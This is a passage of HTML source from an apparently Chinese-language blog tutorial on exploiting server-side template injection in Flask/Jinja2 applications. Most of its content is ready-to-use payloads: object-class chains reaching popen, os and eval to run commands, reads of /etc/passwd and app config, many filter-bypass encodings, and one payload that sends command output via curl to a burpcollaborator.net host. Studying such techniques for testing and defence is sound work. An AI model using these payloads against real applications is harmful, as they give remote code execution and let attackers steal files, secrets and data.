			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220128161810392_huff9a712649d6033d34652bd631615bf5_31195_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220128161810392_huff9a712649d6033d34652bd631615bf5_31195_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;__init__&lt;/code&gt;初始化类，只有初始化后才能使用其方法和属性。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;__globals__&lt;/code&gt;以字典类型返回当前位置的全部模块、方法和全局变量。&lt;/p&gt;
&lt;p&gt;如果被过滤，可以使用以下等效：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;__init__.__globals__[&#39;sys&#39;]
__init__.__getattribute__(&#39;__global&#39;+&#39;s__&#39;)[&#39;sys&#39;]
&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;__dict__&lt;/code&gt;列出属于当前模块的方法和属性，dir()与其作用类似，但是dir()也会显示从父类继承来的属性。一般用在某些方法被过滤了的情况。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 858; 
			flex-basis: 2060px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220128165707628.png&#34; data-size=&#34;352x41&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220128165707628.png&#34;
			width=&#34;352&#34;
			height=&#34;41&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220128165707628_huf77929c28e37fd7312df4df86a951925_4298_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220128165707628_huf77929c28e37fd7312df4df86a951925_4298_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;__builtins__&lt;/code&gt;的使用：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;__builtins__.__dict__[&#39;__import__&#39;](&#39;os&#39;).system(&#39;whoami&#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1614; 
			flex-basis: 3874px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220128165828629.png&#34; data-size=&#34;565x35&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220128165828629.png&#34;
			width=&#34;565&#34;
			height=&#34;35&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220128165828629_huf075ec27a7a6eda5f5ef567faccde9e2_5371_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220128165828629_huf075ec27a7a6eda5f5ef567faccde9e2_5371_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;过滤器的使用&#34;&gt;过滤器的使用&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;attr&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;quot;&amp;quot;|attr(&amp;quot;__class__&amp;quot;)
# 等效于 &amp;quot;&amp;quot;.__calss__
# 常用于点.、中括号[]被过滤
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;format&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;quot;%c%c%c%c%c%c%c%c%c&amp;quot;|format(95,95,99,108,97,115,115,95,95)
# 等效于&#39;__class__&#39;

&amp;quot;&amp;quot;[&amp;quot;%c%c%c%c%c%c%c%c%c&amp;quot;|format(95,95,99,108,97,115,115,95,95)]
# 等效于&amp;quot;&amp;quot;[&amp;quot;__class__&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;join(将接收到的内容进行拼接返回)&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;quot;&amp;quot;[[&#39;__clas&#39;,&#39;s__&#39;]|join] 或者 &amp;quot;&amp;quot;[(&#39;__clas&#39;,&#39;s__&#39;)|join]
# 等效于&amp;quot;&amp;quot;[&amp;quot;__class__&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;lower&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;quot;&amp;quot;[&amp;quot;__CLASS__&amp;quot;|lower]
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;replace&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;quot;__clase__&amp;quot;|replace(&amp;quot;e&amp;quot;,&amp;quot;s&amp;quot;)&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;reverse&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;quot;__ssalc__&amp;quot;|reverse
# 等效于&amp;quot;__class__&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;string(将接收到的内容转为字符串)&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;quot;&amp;quot;.__class__的结果是 &amp;lt;class &#39;str&#39;&amp;gt;
(&amp;quot;&amp;quot;.__class__|string)[0]
# 得到字符&#39;&amp;lt;&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;寻找注入点&#34;&gt;寻找注入点&lt;/h3&gt;
&lt;p&gt;Flask模板注入的关键点就在于&lt;code&gt;{{}}&lt;/code&gt;，所以通常是在多个位置输入{{3*3}}来判断是否会执行并回显。&lt;/p&gt;
&lt;p&gt;一般的判断模板的方法：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 170; 
			flex-basis: 408px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220128173131431.png&#34; data-size=&#34;993x583&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220128173131431.png&#34;
			width=&#34;993&#34;
			height=&#34;583&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220128173131431_hudb4c8723eecf0b6b90cbb2d1417c6835_83117_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220128173131431_hudb4c8723eecf0b6b90cbb2d1417c6835_83117_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;基本漏洞利用&#34;&gt;基本漏洞利用&lt;/h3&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 535; 
			flex-basis: 1284px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220128174040210.png&#34; data-size=&#34;535x100&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220128174040210.png&#34;
			width=&#34;535&#34;
			height=&#34;100&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220128174040210_hu491d1823da7dee4e37e51a0cbdf33f04_8059_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220128174040210_hu491d1823da7dee4e37e51a0cbdf33f04_8059_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;获取object类&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{&amp;quot;&amp;quot;.__class__.__base__}}

{{&amp;quot;&amp;quot;.__class__.__bases__[0]}}

{{&amp;quot;&amp;quot;.__class__.__mro__[-1]}}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 736; 
			flex-basis: 1768px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220128174614633.png&#34; data-size=&#34;663x90&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220128174614633.png&#34;
			width=&#34;663&#34;
			height=&#34;90&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220128174614633_huf818b82b17f8aa581e04c6d668c9ed82_10827_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220128174614633_huf818b82b17f8aa581e04c6d668c9ed82_10827_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;获取所有子类&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{&amp;quot;&amp;quot;.__class__.__mro__[-1].__subclasses__()}}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 266; 
			flex-basis: 639px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220128174712153.png&#34; data-size=&#34;866x325&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220128174712153.png&#34;
			width=&#34;866&#34;
			height=&#34;325&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220128174712153_hub835e28e625a5cb7c28684a4f577008f_92045_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220128174712153_hub835e28e625a5cb7c28684a4f577008f_92045_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在获取到的子类中寻找一些可用的类和方法&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以寻找可执行系统命令的方法为目的，例如&lt;code&gt;popen&lt;/code&gt;方法。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本地寻找：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;target&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;popen&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;num&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cur&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;vm&#34;&gt;__class__&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;__base__&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;__subclasses__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;target&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cur&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;fm&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;vm&#34;&gt;__globals__&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;keys&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
            &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;num&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cur&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;pass&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;num&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1032; 
			flex-basis: 2476px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220129103807758.png&#34; data-size=&#34;258x25&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220129103807758.png&#34;
			width=&#34;258&#34;
			height=&#34;25&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220129103807758_hu3a773e194473ab8c9e846665f5648f48_3502_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220129103807758_hu3a773e194473ab8c9e846665f5648f48_3502_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;结果表明：&lt;code&gt;object&lt;/code&gt;基类的第133个子类有&lt;code&gt;popen&lt;/code&gt;方法，因此可以初始化该类，并以&lt;code&gt;__globals__&lt;/code&gt;获取方法和属性等，并利用。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{&amp;quot;&amp;quot;.__class__.__mro__[-1].__subclasses__()[133].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read()}}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1006; 
			flex-basis: 2415px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220129105647059.png&#34; data-size=&#34;1117x111&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220129105647059.png&#34;
			width=&#34;1117&#34;
			height=&#34;111&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220129105647059_huebd5a3e1a84d9d740bd547601fb11cca_15058_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220129105647059_huebd5a3e1a84d9d740bd547601fb11cca_15058_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;image-20220129105647059&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;image-20220129105647059&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;打印类编号，用于寻找：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{%for i in range(300)%}
{{().__class__.__mro__[-1].__subclasses__()[i]}}
{{i}}
{%endfor%}
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;一般可利用的类和函数&#34;&gt;一般可利用的类和函数&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;针对不同版本有些类的序号需要手动去找&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;config&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用{{config}}查询配置信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;popen&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;用于执行系统命令，使用read()方法读取结果&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;subprocess.Popen&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;用于执行系统命令&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{&amp;quot;&amp;quot;.__class__.__base__.__subclasses__()[213](&#39;whoami&#39;,shell=True,stdout=-1).communicate()[0].strip().decode()}}
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;__import__&lt;/code&gt; (动态加载类和函数)os&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;导入os模块执行系统命令&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{&amp;quot;&amp;quot;.__class__.__base__.__subclasses__()[80].__init__.__globals__.__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()}}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 888; 
			flex-basis: 2133px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220129111643936.png&#34; data-size=&#34;800x90&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220129111643936.png&#34;
			width=&#34;800&#34;
			height=&#34;90&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220129111643936_hu963cb83fd91e6306a6933a5a4eb01dcf_14433_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220129111643936_hu963cb83fd91e6306a6933a5a4eb01dcf_14433_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;image-20220129111643936&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;image-20220129111643936&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1398; 
			flex-basis: 3357px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220129112318835.png&#34; data-size=&#34;1217x87&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220129112318835.png&#34;
			width=&#34;1217&#34;
			height=&#34;87&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220129112318835_hudc1b857720f9606534075278fd25ecd0_15686_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220129112318835_hudc1b857720f9606534075278fd25ecd0_15686_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;image-20220129112318835&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;image-20220129112318835&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;__builtins__&lt;/code&gt;执行代码&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{().__class__.__base__.__subclasses__()[200].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&amp;quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&amp;quot;)}}

{{().__class__.__base__.__subclasses__()[200].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;whoami&#39;).read()}}

{{().__class__.__base__.__subclasses__()[200].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;/etc/passwd&#39;).read()}}
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;request(jinja2中存在request对象)&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{request.__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;whoami&#39;).read()}}

{{request.application.__globals__[&#39;__builtins__&#39;].open(&#39;/etc/passwd&#39;).read()}}
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;url_for、get_flashed_messages、lipsum&lt;/code&gt;(这三个都是函数，可直接调os或使用&lt;code&gt;__builtins__&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{url_for.__globals__[&#39;os&#39;].popen(&#39;whoami&#39;).read()}}

# 读配置
{{url_for.__globals__[&#39;current_app&#39;].config}}

{{url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&amp;quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&amp;quot;)}}
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;FileLoader读取文件&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{&amp;quot;&amp;quot;.__class__.__bases__[0].__subclasses__()[99][&amp;quot;get_data&amp;quot;](0, &amp;quot;/etc/passwd&amp;quot;)}}
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;绕过方法&#34;&gt;绕过方法&lt;/h3&gt;
&lt;h4 id=&#34;过滤&#34;&gt;过滤&lt;code&gt;.&lt;/code&gt;&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{&amp;quot;&amp;quot;.__class__}}

{{&amp;quot;&amp;quot;[&#39;__class__&#39;]}}
{{&amp;quot;&amp;quot;|attr(&amp;quot;__class__&amp;quot;)}
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;过滤引号&#34;&gt;过滤引号&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;request绕过&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# GET
{{&amp;quot;&amp;quot;.__class__.__bases__[0].__subclasses__()[200].__init__.__globals__.__builtins__[request.args.a1](request.args.a2).read()}}&amp;amp;a1=open&amp;amp;a2=/etc/passwd

# POST
{{&amp;quot;&amp;quot;.__class__.__bases__[0].__subclasses__()[200].__init__.__globals__.__builtins__[request.values.a1](request.values.a2).read()}}

POST中的数据：a1=open&amp;amp;a2=/etc/passwd

# Cookie
{{&amp;quot;&amp;quot;.__class__.__bases__[0].__subclasses__()[200].__init__.__globals__.__builtins__[request.cookies.a1](request.cookies.a2).read()}}

Cookie中的数据：a1=open;a2=/etc/passwd
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;使用chr()函数绕过&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 先暴破找出chr函数
{{&amp;quot;&amp;quot;.__class__.__bases__[0].__subclasses__()[暴破点].__init__.__globals__.__builtins__.chr}}

# 原利用payload
{{&amp;quot;&amp;quot;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read()}}

# 用chr()代替引号
{%set chr=[].__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__builtins__.chr%}{{[].__class__.__base__.__subclasses__()[133].__init__.__globals__[chr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)](chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)).read()}}
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;过滤-1&#34;&gt;过滤&lt;code&gt;()&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;只能config看看配置信息&lt;/p&gt;
&lt;h4 id=&#34;过滤_&#34;&gt;过滤&lt;code&gt;_&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;十六进制绕过&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{&amp;quot;&amp;quot;[&amp;quot;\x5f\x5fclass\x5f\x5f&amp;quot;][&amp;quot;\x5f\x5fbases\x5f\x5f&amp;quot;][0][&amp;quot;\x5f\x5fsubclasses\x5f\x5f&amp;quot;]()[133][&amp;quot;\x5f\x5finit\x5f\x5f&amp;quot;][&amp;quot;\x5f\x5fglobals\x5f\x5f&amp;quot;][&#39;popen&#39;](&#39;whoami&#39;)[&#39;read&#39;]()}}
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;引号中的关键字也可以十六进制编码&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Unicode编码绕过&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{&amp;quot;&amp;quot;|attr(&amp;quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&amp;quot;)}}
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;过滤各类关键字&#34;&gt;过滤各类关键字&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;拼接&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{&amp;quot;&amp;quot;[&#39;__cla&#39;+&#39;ss__&#39;].__bases__[0]}}
{{&amp;quot;&amp;quot;[&#39;__cla&#39;&#39;ss__&#39;].__bases__[0]}}

{{&amp;quot;&amp;quot;|attr([&amp;quot;_&amp;quot;*2,&amp;quot;cla&amp;quot;,&amp;quot;ss&amp;quot;,&amp;quot;_&amp;quot;*2]|join)}}
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;格式化&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{&amp;quot;&amp;quot;|attr(request.args.a1|format(request.args.a2))}}&amp;amp;a1=__c%sass__&amp;amp;a2=l
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;过滤&lt;code&gt;__init__&lt;/code&gt;，使用&lt;code&gt;__enter__&lt;/code&gt;和&lt;code&gt;__exit__&lt;/code&gt;替代&lt;/li&gt;
&lt;li&gt;过滤&lt;code&gt;config&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{self}} ⇒ &amp;lt;TemplateReference None&amp;gt;
{{self.__dict__._TemplateReference__context}}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 394; 
			flex-basis: 946px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220204104023156.png&#34; data-size=&#34;1002x254&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220204104023156.png&#34;
			width=&#34;1002&#34;
			height=&#34;254&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220204104023156_hu116b080ecd5de20aa391bbc3ac09782f_84493_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220204104023156_hu116b080ecd5de20aa391bbc3ac09782f_84493_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;image-20220204104023156&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;image-20220204104023156&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;过滤-2&#34;&gt;过滤&lt;code&gt;{}&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;DNS外带&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{% if &amp;quot;&amp;quot;.__class__.__base__.__subclasses__()[133].__init__.__globals__[&#39;popen&#39;](&amp;quot;curl `whoami`.mj9rk9hp8fslvlnxrgsh86yksby1mq.burpcollaborator.net&amp;quot;).read()==&#39;ssti&#39; %}1{% endif %}
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;print&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{%print &amp;quot;&amp;quot;.__class__.__bases__[0].__subclasses__()[200].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&amp;quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&amp;quot;)%}
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;过滤-3&#34;&gt;过滤&lt;code&gt;[]&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
